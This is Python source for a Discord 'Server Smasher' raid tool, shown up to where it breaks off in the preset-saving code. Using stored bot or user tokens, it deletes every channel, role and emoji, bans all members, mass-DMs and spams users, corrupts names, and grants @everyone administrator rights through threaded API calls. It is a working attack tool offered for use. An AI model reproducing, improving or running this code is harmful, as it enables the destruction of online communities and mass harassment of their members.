#!/usr/bin/env python3
# Raid ToolBox Server Smasher
# Author: DeadBread76 - https://github.com/DeadBread76/
# Base code (Server Destroyer): Synchronocy - https://github.com/synchronocy
# ThreadPool: Synchronocy - https://github.com/synchronocy

from smconfig import *
try:
    import os
    import sys
    import json
    import ast
    import time
    import random
    import string
    import ctypes
    import asyncio
    import collections
except Exception as e:
    print ("Module import error: " + str(e))
try:
    import discord
except Exception as e:
    print ("Module import error: " + str(e))
try:
    from dhooks import Webhook
except Exception as e:
    print ("Module import error: " + str(e))
try:
    import requests
except Exception as e:
    print ("Module import error: " + str(e))
try:
    import youtube_dl
except Exception as e:
    print ("Module import error: " + str(e))
try:
    import pyperclip
except Exception as e:
    print ("Module import error: " + str(e))
try:
    from base64 import b64encode
except Exception as e:
    print ("Module import error: " + str(e))
try:
    from tkinter import *
except Exception as e:
    print ("Module import error: " + str(e))
try:
    from tkinter.filedialog import *
except Exception as e:
    print ("Module import error: " + str(e))
try:
    from colorama import init
except Exception as e:
    print ("Module import error: " + str(e))
try:
    from termcolor import colored
except Exception as e:
    print ("Module import error: " + str(e))
try:
    from discord import Permissions
except Exception as e:
    print ("Module import error: " + str(e))
try:
    from threading import Thread
except Exception as e:
    print ("Module import error: " + str(e))
try:
    from queue import Queue
except Exception as e:
    print ("Module import error: " + str(e))
try:
    from concurrent.futures import ThreadPoolExecutor
except Exception as e:
    print ("Module import error: " + str(e))

smversion = sys.argv[1]
menucolour = sys.argv[2]
menucolour2 = sys.argv[3]
termuxmode = int(sys.argv[4])
if termuxmode == 1:
    print("Please Note: Termux mode and server smasher are not fully compatible, Please use at your own risk.")
    input('Press enter to continue.')
else:
    Tk().withdraw()

if sys.platform.startswith('win32'):
    ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Server Smasher v{}".format(smversion))
elif sys.platform.startswith('linux'):
    sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Server Smasher v{}\x07".format(smversion))
ydl_opts = {
    'outtmpl': 'spammer/file.webm',
    'format': 'bestaudio/best',
    'postprocessors': [{
        'key': 'FFmpegExtractAudio',
        'preferredcodec': 'mp3',
        'preferredquality': '192',
    }],
}
class Worker(Thread):
    """
    Pooling
    """

    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as ex:
                pass
            finally:
                self.tasks.task_done()

class ThreadPool:
    """
    Pooling
    """

    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        """
        Add a task to be completed by the thread pool
        """
        self.tasks.put((func, args, kargs))

    def map(self, func, args_list):
        """
        Map an array to the thread pool
        """
        for args in args_list:
            self.add_task(func, args)

    def wait_completion(self):
        """
        Await completions
        """
        self.tasks.join()

pool = ThreadPool(int(threadcount))
loop = asyncio.get_event_loop()
client = discord.Client()
init()
channellist = []

if sys.platform.startswith('win32'):
    clear = lambda: os.system('cls')
    os.system('mode con:cols=70 lines=40')
elif sys.platform.startswith('linux'):
    os.system("printf '\033[8;40;70t'")
    clear = lambda: os.system('clear')

if not os.path.exists("spammer/smtokens.txt"):
    with open ("smtokens.txt","a+") as handle:
        handle.write("\n")
if usemultiple == True:
    useable = []
    useabletokens = []
    clear()
    if clienttype.lower() == "bot":
        with open ("spammer/smtokens.txt", "r") as handle:
            tokens = handle.readlines()
        print ("Getting token info...")
        for token in tokens:
            apilink = 'https://discordapp.com/api/v6/users/@me'
            headers = {'Authorization': "Bot " + token.rstrip(), 'Content-Type': 'application/json'}
            src = requests.get(apilink, headers=headers)
            if "401: Unauthorized" in str(src.content):
                pass
            else:
                response = json.loads(src.content.decode())
                useable.append(response['username']+"#"+response['discriminator']+" (ID: "+str(response['id'])+") ")
                useabletokens.append(token.rstrip())
        while True:
            clear()
            count = -1
            print (colored("Select the Bot to use.\n-------------------------\n",menucolour))
            if sys.platform.startswith('win32'):
                if len(useable) > 40:
                    screensize = 7
                    screensize += len(useable)
                    os.system('mode con:cols=70 lines={}'.format(str(screensize)))
            elif sys.platform.startswith('linux'):
                if len(useable) > 40:
                    screensize = 7
                    screensize += len(useable)
                    os.system("printf '\033[8;{};70t'".format(str(screensize)))
            for bot in useable:
                count += 1
                print(colored(str(count)+". "+bot,menucolour))
            print (colored("\n-------------------------",menucolour))
            botsel = input("\nBot of choice: ")
            try:
                token = useabletokens[int(botsel)]
            except Exception:
                clear()
                print("Invalid Option")
                input()
            else:
                break
    else:
        with open ("tokens.txt", "r") as handle:
            tokens = handle.readlines()
        print ("Getting token info...")
        for token in tokens:
            apilink = 'https://discordapp.com/api/v6/users/@me'
            headers = {'Authorization': token.rstrip(), 'Content-Type': 'application/json'}
            src = requests.get(apilink, headers=headers)
            if "401: Unauthorized" in str(src.content):
                pass
            else:
                response = json.loads(src.content.decode())
                useable.append(response['username']+"#"+response['discriminator']+" (ID: "+str(response['id'])+") ")
                useabletokens.append(token.rstrip())
        while True:
            clear()
            count = -1
            print (colored("Select the User to use.\n-------------------------\n",menucolour))
            if sys.platform.startswith('win32'):
                if len(useable) > 40:
                    screensize = 7
                    screensize += len(useable)
                    os.system('mode con:cols=70 lines={}'.format(str(screensize)))
            elif sys.platform.startswith('linux'):
                if len(useable) > 40:
                    screensize = 7
                    screensize += len(useable)
                    os.system("printf '\033[8;{};70t'".format(str(screensize)))
            for user in useable:
                count += 1
                print(colored(str(count)+". "+user,menucolour))
            print (colored("\n-------------------------",menucolour))
            usersel = input("\nUser of choice: ")
            try:
                token = useabletokens[int(usersel)]
            except Exception:
                clear()
                print("Invalid Option")
                input()
            else:
                break

#Attacks
def deletechannel(channel):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    src = requests.delete("https://discordapp.com/api/v6/channels/"+channel, headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        deletechannel(channel)

def removeban(server,user):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    src = requests.delete("https://discordapp.com/api/v6/guilds/"+str(server)+"/bans/"+str(user), headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        removeban(server,user)

def deleterole(role,server):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    src = requests.delete("https://discordapp.com/api/v6/guilds/"+str(server)+"/roles/"+str(role), headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(3)
        deleterole(role,server)

def createrole(name,server):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    payload = {'hoist': 'true', 'name': name, 'mentionable': 'true', 'color': random.randint(1000000,9999999), 'permissions': random.randint(1,10)}
    src = requests.post('https://ptb.discordapp.com/api/v6/guilds/'+str(server)+'/roles', headers=headers, json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(3)
        createrole(name,server)

def senddmtouser(user,content,usetts):
    dmlist = []
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}

    payload = {
        'recipient_id': user
    }
    src = requests.post('https://discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload)
    userdm = src.content.decode()
    jsonstring = json.loads(userdm).values()
    for x in jsonstring:
        dmlist.append(x)
    userdm = dmlist[2]
    payload = {"content" : content,"tts" : usetts,"mention_everyone" : "true"}
    src = requests.post("https://discordapp.com/api/v6/channels/"+userdm+"/messages", headers=headers, json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        senddmtouser(user,content,usetts)

def banuser(user,server):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    src = requests.put("https://discordapp.com/api/v6/guilds/"+str(server)+"/bans/"+str(user)+"?delete-message-days=1&reason="+str(banreason), headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        banuser(user,server)

def createchannel(server,channelname,channeltype):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    payload = {'name': channelname,'type': channeltype}
    src = requests.post("https://discordapp.com/api/v6/guilds/"+str(server)+"/channels", headers=headers,json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        createchannel(server,channelname,channeltype)

def sendspam(channel,msgcontent,usetts):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    payload = {"content" : msgcontent,"tts" : usetts,"mention_everyone" : "true"}
    src = requests.post("https://discordapp.com/api/v6/channels/"+channel+"/messages", headers=headers, json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        sendspam(channel,msgcontent,usetts)

def mover(server,user,channel):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
    else:
        headers={ 'Authorization': token,'Content-Type': 'application/json'}
    payload = {'channel_id': str(channel)}
    src = requests.patch("https://discordapp.com/api/v6/guilds/"+str(server)+"/members/"+str(user), headers=headers,json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        mover(server,user,channel)

def massnick(server,user,nick):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
    else:
        headers={ 'Authorization': token,'Content-Type': 'application/json'}
    payload = {'nick': str(nick)}
    src = requests.patch("https://discordapp.com/api/v6/guilds/"+str(server)+"/members/"+str(user), headers=headers,json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(5)
        massnick(server,user,nick)

def removeemoji(server,emoji):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
    else:
        headers={ 'Authorization': token,'Content-Type': 'application/json'}
    src = requests.delete('https://discordapp.com/api/v6/guilds/'+str(server)+'/emojis/'+str(emoji),headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        removeemoji(server,emoji)

def addemoji(server,encoded,name): # This has pretty huge rate limits, be careful using it.
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
    else:
        headers={ 'Authorization': token,'Content-Type': 'application/json'}
    payload = {'image': encoded, 'name': name}
    src = requests.post('https://discordapp.com/api/v6/guilds/'+str(server)+'/emojis',headers=headers,json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        addemoji(server,encoded,name)

def corrupt_channel(channelid,channame):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
    else:
        headers={ 'Authorization': token,'Content-Type': 'application/json'}
    corruptchanname = ''
    for x in channame:
        if random.randint(1,2) == 1:
            corruptchanname += asciigen(1)
        else:
            corruptchanname += x
    payload = {'name': corruptchanname}
    src = requests.patch('https://discordapp.com/api/v6/channels/{}'.format(channelid), headers=headers,json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        corrupt_channel(channelid,channame)

def corrupt_role(serverid,roleid,rolename):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
    else:
        headers={ 'Authorization': token,'Content-Type': 'application/json'}
    corruptrolename = ''
    for x in rolename:
        if random.randint(1,2) == 1:
            corruptrolename += asciigen(1)
        else:
            corruptrolename += x
    payload = {'name': corruptrolename}
    src = requests.patch('https://ptb.discordapp.com/api/v6/guilds/{}/roles/{}'.format(serverid,roleid), headers=headers,json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        corrupt_role(serverid,roleid,rolename)

def nsfwchannel(channelid):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
    else:
        headers={ 'Authorization': token,'Content-Type': 'application/json'}
    payload = {'nsfw': 'true'}
    src = requests.patch('https://discordapp.com/api/v6/channels/{}'.format(channelid), headers=headers,json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        nsfwchannel(channelid)

def topicedit(channelid,newtopic):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
    else:
        headers={ 'Authorization': token,'Content-Type': 'application/json'}
    payload = {'topic': newtopic}
    src = requests.patch('https://discordapp.com/api/v6/channels/{}'.format(channelid), headers=headers,json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        topicedit(channelid,newtopic)

def webhook_spam(webhook,content):
    if content == 'asc':
        content = asciigen(1999)
    payload = {'content': content}
    while True:
        requests.post(webhook, json=payload)

clear()
print ("Starting...")

def asciigen(length):
    asc = ''
    for x in range(int(length)):
        num = random.randrange(13000)
        asc = asc + chr(num)
    return asc

def inputselection(text):
    output = input(text)
    return output

def complete_pool():
    pool.wait_completion()
    return None

def gen(size=6, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))

def get_mime(data): # From Discord.py
    if data.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
        return 'image/png'
    elif data[6:10] in (b'JFIF', b'Exif'):
        return 'image/jpeg'
    elif data.startswith((b'\x47\x49\x46\x38\x37\x61', b'\x47\x49\x46\x38\x39\x61')):
        return 'image/gif'
    elif data.startswith(b'RIFF') and data[8:12] == b'WEBP':
        return 'image/webp'

def bytes_to_base64_data(data): # From Discord.py
    fmt = 'data:{mime};base64,{data}'
    mime = get_mime(data)
    b64 = b64encode(data).decode('ascii')
    return fmt.format(mime=mime, data=b64)

@client.event
async def on_ready():
    if changegameonlogin == True:
        await client.change_presence(activity=discord.Game(name=logingame))
    clear()
    print (colored("Login success!","green"))
    await serverselect()

async def serverselect():
    if sys.platform.startswith('win32'):
        window = len(client.guilds)
        window += 9
        os.system('mode con:cols=85 lines={}'.format(str(window)))
    elif sys.platform.startswith('linux'):
        window = len(client.guilds)
        window += 9
        os.system("printf '\033[8;{};85t'".format(str(window)))
    serverlist = []
    clear()
    if clienttype == "bot":
        usert = "Bot"
    else:
        usert = "User"
    print (colored("Logged in as {}".format(client.user.name+"#"+client.user.discriminator,menucolour)))
    print (colored("{} is in the following channels: \n".format(usert),menucolour))
    counter = 0
    serverlist.append("0")
    for serv in client.guilds:
        membcount = len(serv.members)
        counter += 1
        print(colored(str(counter)+'. ('+str(serv.id)+') '+str(serv)+" ({} members)".format(membcount),menucolour))
        serverlist.append(serv.id)
    print('\n----------------------------------------')
    servernum = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Select the server to configure bot actions: ')
    try:
        if int(servernum) == 0:
            await serverselect()
        SERVER = serverlist[int(servernum)]
    except Exception:
        await serverselect()
    await main(SERVER)

async def main(SERVER):
    if sys.platform.startswith('win32'):
        os.system('mode con:cols=70 lines=40')
    elif sys.platform.startswith('linux'):
        os.system("printf '\033[8;40;70t'")
    clear()
    server = client.get_guild(int(SERVER))
    print ("Server: " + colored(server.name,menucolour))
    print ("Server ID: " + colored(str(SERVER),menucolour))
    membercount = len(server.members)
    tchancount = len(server.text_channels)
    vchancount = len(server.voice_channels)
    rolecount = len(server.roles)
    print (colored("{} Members".format(membercount),menucolour))
    print (colored("{} Roles".format(rolecount),menucolour))
    print (colored("{} Text Channels, {} Voice Channels".format(tchancount,vchancount),menucolour))
    print (colored("Nitro Boost Level: {}".format(str(server.premium_tier)),menucolour))
    print ("----------------------------------------")
    print ("Options:")
    print (colored(" 0. More Info\n 1. Configure destruction options. \n 2. Other options \n 3. Create Server Invite. \n 4. Change What the bot is playing. \n 5. Leave server. \n 6. Return to Server Select",menucolour))
    opts = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Select the number for your option: ")
    toggleopts = {
        'namechange': namechange,
        'servname': servname,
        'iconbegone': iconbegone,
        'changeicon': changeicon,
        'iconfile': iconfile,
        'rembans': rembans,
        'chandel': chandel,
        'roledel': roledel,
        'userban': userban,
        'banreason': banreason,
        'userid': userid,
        'senddm': senddm,
        'dmcontent': dmcontent,
        'createchan': createchan,
        'chanmethod': chanmethod,
        'channame': channame,
        'channelno': channelno,
        'usespam': usespam,
        'spammethod': spammethod,
        'usetts': usetts,
        'customtxt': customtxt,
        'gimmieadmin': gimmieadmin,
        'me': me,
        'giveeveryoneadmin': giveeveryoneadmin,
        'createroles': createroles,
        'crolecount': crolecount,
        'rolesname': rolesname,
        'custrolename': custrolename,
        'deleteemojis': deleteemojis,
        'createemojis': createemojis,
        'emojipath': emojipath,
        'emojinum': emojinum
        }
    try:
        if int(opts) == 0:
            clear()
            print(colored("0: Export Detailed Server Info\n",menucolour))
            print(colored("Name: {}".format(str(server.name)),menucolour))
            print(colored("Member Count: {}".format(len(server.members)),menucolour))
            print(colored("Channel Count: {}".format(len(server.channels)),menucolour))
            print(colored("Role Count: {}".format(len(server.roles)),menucolour))
            print(colored("Nitro Boost Level: {}".format(str(server.premium_tier)),menucolour))
            serverfeat = server.features
            if "VIP_REGIONS" in serverfeat:
                print(colored("VIP_REGION: True",menucolour))
            else:
                print(colored("VIP_REGION: False",menucolour))
            if "VANITY_URL" in serverfeat:
                print(colored("VANITY_URL: True",menucolour))
            else:
                print(colored("VANITY_URL: False",menucolour))
            if "INVITE_SPLASH" in serverfeat:
                print(colored("INVITE_SPLASH: True",menucolour))
            else:
                print(colored("INVITE_SPLASH: False",menucolour))
            if "VERIFIED" in serverfeat:
                print(colored("VERIFIED: True",menucolour))
            else:
                print(colored("VERIFIED: False",menucolour))
            if "PARTNERED" in serverfeat:
                print(colored("PARTNERED: True",menucolour))
            else:
                print(colored("PARTNERED: False",menucolour))
            if "MORE_EMOJI" in serverfeat:
                print(colored("MORE_EMOJI: True",menucolour))
            else:
                print(colored("MORE_EMOJI: False",menucolour))
            if "DISCOVERABLE" in serverfeat:
                print(colored("DISCOVERABLE: True",menucolour))
            else:
                print(colored("DISCOVERABLE: False",menucolour))
            if "COMMERCE" in serverfeat:
                print(colored("COMMERCE: True",menucolour))
            else:
                print(colored("COMMERCE: False",menucolour))
            if "LURKABLE" in serverfeat:
                print(colored("LURKABLE: True",menucolour))
            else:
                print(colored("LURKABLE: False",menucolour))
            if "NEWS" in serverfeat:
                print(colored("NEWS: True",menucolour))
            else:
                print(colored("NEWS: False",menucolour))
            if "BANNER" in serverfeat:
                print(colored("BANNER: True",menucolour))
            else:
                print(colored("BANNER: False",menucolour))
            if "ANIMATED_ICON" in serverfeat:
                print(colored("ANIMATED_ICON: True",menucolour))
            else:
                print(colored("ANIMATED_ICON: False",menucolour))
            se = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"\n")
            if se == "0":
                with open("{} info.txt".format(server.name), "w+", errors='ignore') as handle:
                    handle.write("Server Name: {}\n".format(str(server.name)))
                    handle.write("Server ID: {}\n".format(str(server.id)))
                    handle.write("Server Reigon: {}\n".format(str(server.region)))
                    handle.write("Server Icon: {}\n".format(str(server.icon_url)))
                    feature = ''
                    p = 0
                    for f in server.features:
                        p += 1
                        if p == len(server.features):
                            feature += "{}".format(f)
                        else:
                            feature += "{}, ".format(f)
                    handle.write("Server Features: {}\n".format(feature))
                    handle.write("Member Count: {}, see member list below.\n".format(len(server.members)))
                    handle.write("Channel Count: {}, see channel list below.\n".format(len(server.channels)))
                    handle.write("Role Count: {}, see role list below.\n".format(len(server.roles)))
                    handle.write("Ammount of users boosting server: {}\n".format(str(server.premium_subscription_count)))
                    handle.write("Nitro Boost Level: {}\n".format(str(server.premium_tier)))
                    handle.write("\n===============================\nText Channels:\n===============================\n\n")
                    for channel in server.text_channels:
                        try:
                            handle.write("Name: {}\nID: {}\nTopic: {}\nSlowmode Delay: {}\nPosition: {}\nCategory: {}\n\n-----------------------\n\n".format(channel.name,str(channel.id),channel.topic,str(channel.slowmode_delay),str(channel.position),client.get_channel(channel.category_id).name))
                        except Exception:
                            pass
                    handle.write("\n===============================\nVoice Channels:\n===============================\n\n")
                    for channel in server.voice_channels:
                        try:
                            handle.write("Name: {}\nID: {}\nBitrate: {}\nUser limit: {}\nPosition: {}\nCategory: {}\nConnected users:\n\n".format(channel.name,str(channel.id),str(channel.bitrate),str(channel.user_limit),str(channel.position),client.get_channel(channel.category_id).name))
                            for u in channel.members:
                                handle.write("User: {}#{}\nID: {}\nBot: {}\n".format(u.name,u.discriminator,str(u.id),str(u.bot)))
                                handle.write("\n-----------------------\n\n")
                        except Exception:
                            pass
                    handle.write("\n===============================\nRoles:\n===============================\n\n")
                    for role in server.roles:
                        try:
                            handle.write("Name: {}\nID: {}\nColour: {}\nHoisted: {}\nPositon: {}\nMentionable: {}\nPermissions: {}\n\n-----------------------\n\n".format(role.name,str(role.id),str(role.colour.value),str(role.hoist),str(role.position),str(role.mentionable),str(role.permissions)))
                        except Exception:
                            pass
                    handle.write("\n===============================\nUsers:\n===============================\n\n")
                    for user in server.members:
                        try:
                            handle.write("Name: {}#{}\nID: {}\nAvatar: {}\nBot: {}\nDate Joined: {}\nNickname: {}\n\n-----------------------\n\n".format(user.name,str(user.discriminator),str(user.id),str(user.avatar_url),str(user.bot),str(user.joined_at),user.nick))
                        except Exception:
                            pass
                print("Exported to {} info.txt".format(server.name))
                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Press enter to return to menu.")
            await main(SERVER)

        elif int(opts) == 1:
            async def changesettings(toggleopts,SERVER):
                if sys.platform.startswith('win32'):
                    os.system('mode con:cols=70 lines=40')
                elif sys.platform.startswith('linux'):
                    os.system("printf '\033[8;40;70t'")
                try:
                    clear()
                    server = client.get_guild(int(SERVER))
                    print (colored("Type 'start' to start.",menucolour))
                    print (colored("S.  Save Config",menucolour))
                    print (colored("L.  Load Config",menucolour))
                    print (colored("0.  Go back",menucolour))
                    print (colored("1.  Change server name: {}".format(toggleopts['namechange']),menucolour))
                    print (colored("2.  New Server Name: {}".format(toggleopts['servname']),menucolour))
                    print (colored("3.  Remove server icon: {}".format(toggleopts['iconbegone']),menucolour))
                    print (colored("4.  Change server icon: {}".format(toggleopts['changeicon']),menucolour))
                    print (colored("5.  Icon Filename: {}".format(toggleopts['iconfile']),menucolour))
                    print (colored("6.  Remove Bans: {}".format(toggleopts['rembans']),menucolour))
                    print (colored("7.  Delete all channels: {}".format(toggleopts['chandel']),menucolour))
                    print (colored("8.  Delete all roles: {}".format(toggleopts['roledel']),menucolour))
                    print (colored("9.  Ban all members: {}".format(toggleopts['userban']),menucolour))
                    print (colored("10. Ban Reason: {}".format(toggleopts['banreason']),menucolour))
                    print (colored("11. Users to not Ban: {}".format(toggleopts['userid']),menucolour))
                    print (colored("12. Send DM to everyone: {}".format(toggleopts['senddm']),menucolour))
                    print (colored("13. DM Content: {}".format(toggleopts['dmcontent']),menucolour))
                    print (colored("14. Create Channels: {}".format(toggleopts['createchan']),menucolour))
                    print (colored("15. Channel Creation type: {}".format(toggleopts['chanmethod']),menucolour))
                    print (colored("16. Name for the created channels: {}".format(toggleopts['channame']),menucolour))
                    print (colored("17. Number of channels to create: {}".format(toggleopts['channelno']),menucolour))
                    print (colored("18. Spam after destruction: {}".format(toggleopts['usespam']),menucolour))
                    print (colored("19. Spamming method: {}".format(toggleopts['spammethod']),menucolour))
                    print (colored("20. Text to spam: {}".format(toggleopts['customtxt']),menucolour))
                    print (colored("21. Use text to speech in message: {}".format(toggleopts['usetts']),menucolour))
                    print (colored("22. Give yourself admin: {}".format(toggleopts['gimmieadmin']),menucolour))
                    print (colored("23. Your ID: {}".format(toggleopts['me']),menucolour))
                    print (colored("24. Give @everyone admin: {}".format(toggleopts['giveeveryoneadmin']),menucolour))
                    print (colored("25. Create Roles: {}".format(toggleopts['createroles']),menucolour))
                    print (colored("26. Number of roles to create: {}".format(toggleopts['crolecount']),menucolour))
                    print (colored("27. Role Creation type: {}".format(toggleopts['rolesname']),menucolour))
                    print (colored("28. Name of roles: {}".format(toggleopts['custrolename']),menucolour))
                    print (colored("29. Delete Emojis: {}".format(toggleopts['deleteemojis']),menucolour))
                    print (colored("30. Create Emojis: {}".format(toggleopts['createemojis']),menucolour))
                    print (colored("31. Created emoji image path: {}".format(toggleopts['emojipath']),menucolour))
                    print (colored("32. Number of created emojis: {}".format(toggleopts['emojinum']),menucolour))
                    toga = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Item to toggle or change:\n")
                    if toga == 'E':
                        while True:
                            print(asciigen(10000))
                    if toga.lower() == "start":
                        for channel in server.channels:
                            myperms = channel.permissions_for(server.get_member(client.user.id))
                            if myperms.administrator:
                                pass
                            else:
                                print (colored("You do not have admin permissions on this server.","red"))
                                con = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Continue anyway?(Y/N)")
                                if con.lower() == 'y':
                                    break
                                else:
                                    await main(SERVER)

                        if toggleopts['chandel'] == True:
                            print('Deleting channels.')
                            for channel in server.channels:
                                print (colored("Deleting " + str(channel.name),"blue"))
                                pool.add_task(deletechannel,str(channel.id))
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                            print('Finished deleting channels.')

                        if toggleopts['roledel'] == True:
                           print ('Deleting Roles.')
                           for role in server.roles:
                                print (colored("Deleting role: " + role.name,"blue"))
                                pool.add_task(deleterole,str(role.id),SERVER)
                           pool.wait_completion()
                           print('Finished deleting roles.')

                        if toggleopts['rembans'] == True:
                            print ("Removing bans.")
                            try:
                                bans = await server.bans()
                                for ban in bans:
                                    print(colored("Removing ban for: {}".format(str(ban.user))))
                                    pool.add_task(removeban,str(server.id),str(ban.user.id))
                            except Exception as e:
                                print (e)

                        if toggleopts['deleteemojis'] == True:
                            print ("Deleting Emojis.")
                            for emoji in server.emojis:
                                pool.add_task(removeemoji,server.id,emoji.id)
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

                        if toggleopts['senddm'] == True:
                            for user in server.members:
                                print (colored('Sending DM to ' + user.name,"blue"))
                                pool.add_task(senddmtouser,user.id,toggleopts['dmcontent'],toggleopts['usetts'])
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

                        if toggleopts['namechange'] == True:
                            print('Changing server name...')
                            try:
                                await server.edit(name=str(toggleopts['servname']))
                            except Exception as er:
                                print(er)

                        if toggleopts['iconbegone'] == True:
                            print('Removing icon...')
                            try:
                                await server.edit(icon=None)
                            except Exception as er:
                                print(er)

                        if toggleopts['changeicon'] == True:
                            print('Changing icon...')
                            with open(toggleopts['iconfile'], 'rb') as handle:
                                icon = handle.read()
                                try:
                                    await server.edit(icon=icon)
                                except Exception as er:
                                    print(er)

                        if toggleopts['giveeveryoneadmin'] == True:
                            print('Giving everyone admin...')
                            for role in server.roles:
                                if role.name == '@everyone':
                                    try:
                                        await role.edit(permissions=Permissions.all())
                                    except Exception as er:
                                        print(er)
                                    break

                        if toggleopts['userban'] == True:
                            print('Banning users...')
                            for user in server.members:
                                if str(user.name+"#"+user.discriminator) in toggleopts['userid']:
                                    print (colored("Not Banning " + str(user.name),"green"))
                                else:
                                    print (colored('Banning ' + str(user.name),"blue"))
                                    pool.add_task(banuser,str(user.id),SERVER)
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

                        if toggleopts['gimmieadmin'] == True:
                            print('Giving you admin...')
                            role = await server.create_role(name="Admin", permissions=Permissions.all())
                            user = server.get_member(int(toggleopts['me']))
                            await user.add_roles(role)

                        if toggleopts['createchan'] == True:
                            print('Creating channels.')
                            for x in range(int(toggleopts['channelno'])):
                                if toggleopts['chanmethod'].lower() == "ascii":
                                    pool.add_task(createchannel,SERVER,asciigen(60),"text")
                                if toggleopts['chanmethod'].lower() == "set":
                                    pool.add_task(createchannel,SERVER,toggleopts['channame'],"text")

                                if toggleopts['chanmethod'].lower() == "voice":
                                    pool.add_task(createchannel,SERVER,toggleopts['channame'],"voice")
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                            print ('Channels Created.')

                        if toggleopts['createroles'] == True:
                            print('Creating roles.')
                            for x in range(int(toggleopts['crolecount'])):
                                if toggleopts['rolesname'] == "set":
                                    pool.add_task(createrole,toggleopts['custrolename'],server.id)
                                if toggleopts['rolesname'] == "ascii":
                                    pool.add_task(createrole,asciigen(60),server.id)
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

                        if toggleopts['createemojis'] == True:
                            print ("Creating Emojis")
                            with open(toggleopts['emojipath'], "rb") as handle:
                                encoded = bytes_to_base64_data(handle.read())
                            for x in range(int(toggleopts['emojinum'])):
                                pool.add_task(addemoji,server.id,encoded,gen())
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

                        if toggleopts['chanmethod'].lower() == "voice":
                            if toggleopts['chandel'] == True:
                                print (colored("Not spamming, due to there only being voice channels in this server.","red"))
                                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"")
                                await main(SERVER)

                        if toggleopts['usespam'] == True:
                            print('Spam will start in 5 seconds.')
                            if toggleopts['spammethod'] == "asc":
                                await ascii_spam(SERVER,toggleopts['usetts'])
                            if toggleopts['spammethod'] == "massment":
                                await mass_tag(SERVER,toggleopts['usetts'])
                            if toggleopts['spammethod'] == "text":
                                await text_spam(SERVER,toggleopts['customtxt'],toggleopts['usetts'])
                            if toggleopts['spammethod'] == "everyone":
                                await everyonespam(SERVER,toggleopts['usetts'])
                        else:
                            print ("Finished!")
                            await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"")
                            await main(SERVER)
                    if toga.lower() == 's':
                        presetname = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Name Of Preset: ')
                        if not os.path.exists("spammer/presets/"):
                            os.mkdir("spammer/presets/")
                        with open ("spammer/presets/{}.smpreset".format(presetname),"w+", errors='ignore') as handle:
                            handle.write(str(toggleopts))
